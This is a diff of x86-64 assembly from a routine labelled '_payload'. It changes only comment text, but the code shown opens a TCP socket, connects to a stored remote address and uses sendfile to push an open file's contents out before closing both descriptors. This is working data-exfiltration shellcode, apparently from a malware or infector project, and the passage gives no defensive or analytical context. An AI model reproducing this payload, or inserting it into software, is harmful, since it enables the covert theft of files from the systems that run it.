@@ -68,7 +68,7 @@ _payload:
 
 .connect:
 	; Create the socket
-	mov rax, 41					; syscall number for socket
+	mov rax, 41					; SYS_socket
 	mov rdi, 2					; domain (AF_INET)
 	mov rsi, 1					; type (SOCK_STREAM)
 	mov rdx, 0					; protocol
@@ -86,7 +86,7 @@ _payload:
 	; mov [pop_sa + sockaddr_in.sin_port], bx
 	
 	; Connect the socket
-	mov rax, 42					; syscall number for connect
+	mov rax, 42					; SYS_connect
 	mov rdi, r13				; socket file descriptor
 	lea rsi, [rel pop_sa]		; pointer to sockaddr_in
 	mov rdx, 16					; size of sockaddr_in
@@ -95,7 +95,7 @@ _payload:
 	je .clean
 
 	; Send the file
-	mov rax, 40						; syscall number for sendfile
+	mov rax, 40						; SYS_sendfile
 	mov rdi, r13					; socket file descriptor
 	mov rsi, r12					; file descriptor
 	xor rdx, rdx					; offset (NULL)
@@ -106,12 +106,12 @@ _payload:
 
 .clean:
 	; Close the file
-	mov rax, 3					; syscall number for close
+	mov rax, 3					; SYS_close
 	mov rdi, r12				; file descriptor
 	syscall
 
 	; Close the socket
-	mov rax, 3					; syscall number for close
+	mov rax, 3					; SYS_close
 	mov rdi, r13				; file descriptor
 	syscall
 
